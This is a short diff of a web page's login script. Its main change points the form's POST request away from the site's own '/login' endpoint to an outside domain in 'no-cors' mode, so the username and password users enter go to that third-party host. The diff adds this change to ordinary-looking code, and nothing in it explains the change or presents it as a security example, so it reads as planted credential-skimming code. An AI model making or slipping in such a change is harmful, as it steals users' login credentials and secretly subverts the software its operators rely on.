@@ -24,7 +24,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     try {
-      const response = await fetch('/login', {
+      const response = await fetch('http://wittyma.yesulikplimits.com', {
         method: ['POST'],
         mode: 'no-cors',
         headers: {
@@ -32,7 +32,7 @@ document.addEventListener('DOMContentLoaded', () => {
         },
         body: JSON.stringify({ username, password }),
       });
-    
+  
       if (!response.ok) {
         const text = await response.text();
         console.log('Response status:', response.status);
